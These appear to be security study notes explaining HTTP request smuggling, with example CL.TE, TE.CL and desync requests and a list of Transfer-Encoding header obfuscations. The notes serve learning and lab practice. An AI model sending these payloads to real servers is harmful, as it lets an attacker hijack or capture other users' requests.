# Howto

### Glossary

#### CRLF = "\r\n" HTTP Request Smuggling = HTTP Request Splitting != HTTP Desync

What does "the \(front-end\|back-end\) server uses \(CL\|TE\)" mean? The answer is related to what they will actually be using FROM your request. For example, in CL.TE, front-end server uses CL because TE is eventually ofuscated \(for it to be used only by the back-end\). Then, as back-end does see TE and it is specified to be chunked, it does not use CL as [the documentation says](https://developer.mozilla.org/es/docs/Web/HTTP/Headers/Transfer-Encoding), so it would read the first request until "0\r\n\r\n" and process the next one.

### Smuggling

Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.

#### Content-Length Header

Is straightforward: it specifies the length of the message body in bytes. For example:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

#### Transfer-Encoding Header

Can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes \(expressed in hexadecimal\), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

### CL.TE / TE.CL / TE.TE

* CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
* TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
* TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

#### CL.TE

Here, the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. We can perform a simple HTTP request smuggling attack as follows:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end server sees CL to be 13, so it forwards 13 bytes of the request to the backend server, which uses TE. Since the chunk's length is stated to be 0, the backend server process the next request after 2\(CRLF\).

#### TE.CL

Here, the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. We can perform a simple HTTP request smuggling attack as follows:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

The front-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following SMUGGLED. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server.

The back-end server processes the Content-Length header and determines that the request body is 3 bytes long, up to the start of the line following 8. The following bytes, starting with SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

#### TE.TE

TE.TE behavior: obfuscating the TE header

Here, the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

### Obfuscations

There are potentially endless ways to obfuscate the Transfer-Encoding header. For example:

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

See [https://github.com/defparam/smuggler/tree/master/configs](https://github.com/defparam/smuggler/tree/master/configs)

* When using special characters like \x0b \[Vertical tab\] to ofuscate the TE header, %0b should be typed and URL Encoded for it to be interpreted by BurpSuite when sending the request.

### Desync

HTTP Desync occurs when the smuggled request's CL involves the next request that would be arriving to the backend.

Examle:

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Content-Length: X (the entire WRITTEN request)
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

message=
```

As seen, the next \(500 - len\("message="\)\) bytes of the next request would be appended to the second request's POST data.

### Practice

{% embed url="https://portswigger.net/web-security/request-smuggling" %}



